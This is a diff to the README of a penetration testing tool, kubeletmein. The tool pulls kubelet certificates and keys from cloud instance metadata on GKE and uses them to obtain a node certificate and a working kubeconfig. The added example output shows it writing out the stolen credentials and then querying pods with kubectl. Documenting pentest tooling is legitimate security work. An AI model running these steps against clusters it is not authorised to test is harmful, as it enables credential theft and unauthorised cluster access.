@@ -8,7 +8,7 @@ This is a simple penetration testing tool which takes advantage of public cloud 
 
 It reads kubelet credentials from the cloud provider metadata and configures a kubeconfig file that you can use with `kubectl` to access the API.
 
-## Support providers
+## Supported providers
 
 ### GKE
 
@@ -33,7 +33,30 @@ It's a single binary compiled for Linux. Download it with `cURL` or `wget` from 
 
 On GKE kubeletmein is a two stage process. First we write out a bootstrap-kubeconfig using the certificates and key from the `kube-env` instance attribute. Then we generate a certificate sigining request and use the bootstrap config to submit it to the API for approval.
 
+```
+~ $ kubeletmein gke bootstrap
+2018-11-29T21:21:26Z [ℹ]  writing ca cert to: ca-certificates.crt
+2018-11-29T21:21:26Z [ℹ]  writing kubelet cert to: kubelet.crt
+2018-11-29T21:21:26Z [ℹ]  writing kubelet key to: kubelet.key
+2018-11-29T21:21:26Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
+2018-11-29T21:21:26Z [ℹ]  wrote bootstrap-kubeconfig
+2018-11-29T21:21:26Z [ℹ]  now generate a new node certificate with: kubeletmein gke generate
+```
+
 Then we download the certificate and configure `kubeconfig`.
+
+```
+~ $ kubeletmein gke generate -n gke-cluster19-default-pool-6c73beb1-wmh3
+2018-11-29T21:23:33Z [ℹ]  using bootstrap-config to request new cert for node: gke-cluster19-default-pool-6c73beb1-wmh3
+2018-11-29T21:23:33Z [ℹ]  got new cert and wrote kubeconfig
+2018-11-29T21:23:33Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+```
+
+Now you can use the kubeconfig, as it suggests.
+
+```
+kubectl --kubeconfig get pods
+```
 
 ### EKS
 
